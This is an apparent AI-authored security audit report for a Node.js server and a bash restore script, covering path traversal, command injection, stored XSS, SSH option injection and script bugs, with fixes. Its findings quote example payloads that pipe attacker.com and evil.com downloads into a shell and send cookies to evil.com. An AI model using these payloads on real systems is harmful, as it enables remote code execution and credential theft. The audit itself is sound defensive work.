# Claw Manager — Code Audit Report

**Date:** 2026-03-22  
**Scope:** `server.js`, `scripts/rehydrate.sh`  
**Auditor:** ClawBack (subagent)

---

## Summary

| Severity | Count | Fixed in-file? |
|----------|-------|----------------|
| P0 — Critical | 4 | ✅ All fixed |
| P1 — High | 6 | ❌ Documented only |
| P2 — Medium | 6 | ❌ Documented only |

---

## P0 — Critical (Fixed)

### P0-1: Path Traversal in `/api/logs/:file`
**File:** `server.js` ~L210  
**Risk:** Arbitrary file read on the server  
**Detail:**  
```js
const logFile = path.join(LOG_DIR, req.params.file);
```
`path.join('/foo/logs', '../instances.json')` resolves to `/foo/instances.json`, outside LOG_DIR. An unauthenticated caller can read any file the process has access to — including `instances.json` (with SSH key paths), `server.js`, `/etc/passwd`, etc.

**Fix applied:** Use `path.basename()` to strip directory components, then verify the resolved path is still inside LOG_DIR.

---

### P0-2: Command Injection in `/api/restore`
**File:** `server.js` ~L220  
**Risk:** Remote code execution via unsanitized `oldUser` / `newUser` / `archivePath`  
**Detail:**  
```js
const cmd = `bash "${rehydrateScript}" "${archivePath}" "${oldUser || 'openclaw'}" "${newUser || os.userInfo().username}"`;
```
A `newUser` value of `a" && curl attacker.com/shell | bash #` injects shell commands. The `archivePath` existence check prevents injecting non-existent paths but `$(...)` substitution inside double-quoted strings still executes.

**Fix applied:**  
- Validate `oldUser`/`newUser` against `/^[a-z_][a-z0-9_-]{0,31}$/`
- Validate `archivePath` is inside `BACKUP_DIR` and ends with `.tar.gz`
- Added length cap on user fields

---

### P0-3: `runAsync()` Missing `error` Event Handler  
**File:** `server.js` ~L60  
**Risk:** Uncaught exception crashes the process  
**Detail:**  
Node.js `child_process.exec()` emits an `error` event if the subprocess cannot be spawned (e.g., `exec` fails with ENOENT, EACCES). Without a handler, this becomes an unhandled `EventEmitter` error and crashes the server.  

```js
const proc = exec(cmd, { shell: '/bin/bash' });
// No proc.on('error', ...) — will crash if spawn fails
```

**Fix applied:** Added `proc.on('error', ...)` handler that gracefully resolves the promise.

---

### P0-4: Unhandled Promise Rejections in Fire-and-Forget Operations
**File:** `server.js` — `/api/backup`, `/api/transfer`, `/api/restore` routes  
**Risk:** Unhandled rejection → process crash (Node 15+ terminates on unhandled rejections)  
**Detail:**  
All three routes fire async work after sending the response:  
```js
runAsync(cmd, logFile).then(result => { ... });           // /api/backup — no .catch()
// /api/transfer and /api/restore: same pattern
```
If `runAsync` rejects (e.g., log file write fails), there is no `.catch()` and Node will terminate.

**Fix applied:** Added `.catch(err => console.error(...))` to all fire-and-forget promise chains.

---

## P1 — High (Not Fixed — Action Required)

### P1-1: No Authentication — Server Binds to 0.0.0.0
**File:** `server.js` L~end  
**Risk:** Anyone who can reach port 7788 can execute commands, read logs, trigger restores  
**Detail:**  
```js
app.listen(PORT, '0.0.0.0', () => { ... });
```
All endpoints are unauthenticated. In a home-lab context this may be acceptable, but if the port is reachable from the internet (e.g., firewall open, VPS), this is a full RCE surface. The `/api/restore` and `/api/backup` endpoints in particular execute shell commands.

**Suggested fix:**  
- At minimum, add a static bearer token middleware: check `Authorization: Bearer <token>` where token is set in an env var (`CLAW_MANAGER_TOKEN`)
- Or bind to `127.0.0.1` only and use SSH tunnelling
- Firewall rule: `ufw allow from 192.168.x.x/24 to any port 7788`

---

### P1-2: XSS in Frontend (innerHTML with unsanitized instance data)
**File:** `server.js` HTML section, `renderInstances()` and `renderHealthResult()`  
**Risk:** Stored XSS — malicious instance `name`/`user`/`host` executes as JS  
**Detail:**  
```js
el.innerHTML = instances.map(inst => `
  <div class="instance-name">${inst.name}</div>
  ...
  <span class="check-name">${c.name}</span>
  <span class="check-detail">${c.detail || ''}</span>
`).join('');
```
An instance saved with `name: "<img src=x onerror=fetch('//evil.com?c='+document.cookie)>"` will execute. Verification check names/details from shell command output also flow directly into innerHTML.

**Suggested fix:** Add a `htmlEscape()` helper:
```js
function htmlEscape(str) {
  return String(str)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
```
Wrap all user-controlled values in template literals with `${htmlEscape(inst.name)}`.

---

### P1-3: `sshCmd()` — `instance.ssh_key` / `user` / `host` Not Sanitized
**File:** `server.js` `sshCmd()` ~L47  
**Risk:** Shell injection via stored instance data  
**Detail:**  
```js
const key = instance.ssh_key ? `-i ${expandHome(instance.ssh_key)}` : '';
return `ssh ... ${key} ${instance.user}@${instance.host} "${cmd.replace(/"/g, '\\"')}"`;
```
A `ssh_key` value of `~/.ssh/key -o ProxyCommand="curl evil.com|sh"` injects SSH options. `instance.user` and `instance.host` are also unquoted in the command string. Only `"` is escaped in `cmd`, not backticks, `$()`, or newlines.

**Suggested fix:** Quote the key path and validate user/host against safe patterns before use. For production, switch to `execFile` with an argument array.

---

### P1-4: `rehydrate.sh` Step 7 — `find -o -exec` Bug
**File:** `scripts/rehydrate.sh` ~L173  
**Risk:** Scripts not rewritten during user migration → broken paths after restore  
**Detail:**  
```bash
find "$NEW_HOME/.openclaw/workspace/scripts" -name "*.py" -o -name "*.sh" 2>/dev/null -exec \
  sed -i "s|$OLD_HOME|$NEW_HOME|g" {} \;
```
Without parentheses around the `-o` group, POSIX precedence means `-exec` only applies to `-name "*.sh"`, not `.py` files. Python scripts will **not** have their paths rewritten.

**Suggested fix:**
```bash
find "$NEW_HOME/.openclaw/workspace/scripts" \( -name "*.py" -o -name "*.sh" \) \
  -exec sed -i "s|$OLD_HOME|$NEW_HOME|g" {} \;
```

---

### P1-5: Strip Count Correctness in `rehydrate.sh` Steps 4 & 5
**File:** `scripts/rehydrate.sh` ~L108, L130  
**Risk:** Files extracted to wrong paths → silent restore failure  
**Detail:**  
Archive path structure (assumed):
```
ARCHIVE_ROOT/payload/posix/home/OLD_USER/.openclaw/openclaw.json
 (1)          (2)     (3)   (4) (5)        (6)
```
Step 4 uses `--strip-components=5`, extracts into `-C "$NEW_HOME/.openclaw"`.  
After strip-5, remaining path = `.openclaw/openclaw.json`.  
Final destination = `$NEW_HOME/.openclaw/.openclaw/openclaw.json` ← **double `.openclaw`**

Correct options:
- Either use `--strip-components=6` with `-C "$NEW_HOME/.openclaw"` (removes the `.openclaw` component)
- Or use `--strip-components=5` with `-C "$NEW_HOME"` (extract into home, `.openclaw` dir is created)

Step 5 has an analogous off-by-one with workspace (strip-6 into workspace dir → `workspace/AGENTS.md` inside workspace dir).

**Note:** This depends on the exact openclaw backup archive structure. Verify against a real `openclaw backup create` archive before changing. Step 6 uses dynamic strip count (correctly computed) which can serve as a reference.

---

### P1-6: Log Endpoint Exposes Sensitive Data Without Auth
**File:** `server.js` `/api/logs/:file`  
**Risk:** SSH credentials, tokens, API keys in log output readable by anyone  
**Detail:**  
`openclaw backup create --verify` and `openclaw status` output may contain session tokens, channel tokens, or proton credentials. All log content is served unauthenticated. Combined with P1-1 (no auth), this is a significant data leakage risk on internet-facing deployments.

**Suggested fix:** See P1-1 (add token auth). Separately, consider redacting common secret patterns (Bearer tokens, `token:`, `password:`) from log output before writing.

---

## P2 — Medium

### P2-1: Log File Growth — No Rotation or Cleanup
**File:** `server.js` — `runAsync()`, all log writes  
Status/cron log files (`status_<id>.log`) are opened with `flags: 'a'` and grow indefinitely. Heavy usage could fill disk.

**Suggested fix:** Rotate by size in `runAsync()` — if file > 1MB, truncate or roll over:
```js
try {
  const stat = fs.statSync(logFile);
  if (stat.size > 1_000_000) fs.writeFileSync(logFile, ''); // truncate
} catch {}
```
Or use a proper logger like `winston` with daily rotation.

---

### P2-2: Verification Endpoint — No Overall Timeout
**File:** `server.js` `runVerification()` ~L120  
The function runs 12+ sequential `exec()` calls, each with a 15s timeout. Total max wall time: ~180s. The HTTP response is held open for the full duration. A hung SSH connection or unresponsive remote instance will block the route handler for minutes.

**Suggested fix:** Wrap `runVerification()` in a `Promise.race()` with a global 60s timeout.

---

### P2-3: `rehydrate.sh` Fail Trap May Lose Output with `exec > >(tee)`
**File:** `scripts/rehydrate.sh` ~L54, L73  
The fail trap's `echo` lines go to stdout → into the tee subprocess. If the script fails and tee hasn't flushed its buffer (or has already exited), the FAILED message may be lost. Only the explicit `>> "$LOG"` line in the trap is reliable.

**Suggested fix:** In the trap, write all output directly to the log file:
```bash
trap '
  if [[ $REHYDRATE_STEP -lt 9 ]]; then
    echo "" >> "$LOG"
    echo "!!! REHYDRATION FAILED at step $REHYDRATE_STEP !!!" >> "$LOG"
    echo "REHYDRATION_FAILED step=$REHYDRATE_STEP" >> "$LOG"
  fi
' EXIT
```

---

### P2-4: `loadInstances()` Silent Failure on Corrupt JSON
**File:** `server.js` ~L28  
```js
} catch (e) { return []; }
```
A corrupt `instances.json` silently returns an empty array. Subsequent `POST /api/instances` will overwrite the file with only the new instance, permanently losing all existing configuration.

**Suggested fix:** Distinguish `ENOENT` (file missing → return `[]`) from parse errors (log error, throw or return the raw file content for inspection).

---

### P2-5: Frontend `populateSelects()` — No `onChange` Handler for Health Select
**File:** `server.js` HTML, `populateHealthSelect()` / `loadCachedHealth()`  
The health instance `<select>` has no `onchange` attribute. If the user changes the selected instance, `loadCachedHealth()` is not called. The cached health display stays stale until "Run Verification" is clicked.

**Suggested fix:** Add `onchange="loadCachedHealth()"` to `<select id="health-instance">`.

---

### P2-6: Transfer — `remotePath` From Shell Output Used in scp Command
**File:** `server.js` `/api/transfer` ~L175  
```js
const match = backupResult.stdout.match(/Backup archive: (.+\.tar\.gz)/);
const remotePath = match[1].trim();
scpCmd = `scp ... "${remotePath}" "${localPath}"`;
```
`remotePath` comes from parsing SSH output. If the backup process can be influenced to output a crafted path, it could inject into the SCP command. Low risk in practice (you control the source), but worth noting.

---

## Gaps / Missing Features

1. **No authentication** (P1-1) — the most important missing feature for production use
2. **No HTTPS** — credentials/tokens in logs served over plain HTTP
3. **No restart recovery** — if the Node process crashes, there's no supervisor (PM2, systemd unit)
4. **No backup retention policy** — archives accumulate in `~` indefinitely
5. **No verification polling** — verify endpoint blocks; large instances could trigger browser timeouts
6. **No instance edit UI** — adding is supported but editing requires manual JSON changes
7. **Transfer only pulls to localhost** — no push path (localhost → remote) 
8. **`openclaw_state` field in instance config not validated** — used in `runVerification()` to derive paths; could be used to probe arbitrary paths if set maliciously

---

## Files Changed

- `server.js` — P0-1, P0-2, P0-3, P0-4 fixed
- `AUDIT.md` — this file (created)

`rehydrate.sh` P1-4 (find bug) is documented but not auto-fixed here since it requires testing against real backup archives and could break an existing working restore flow if the archive structure differs from assumption.
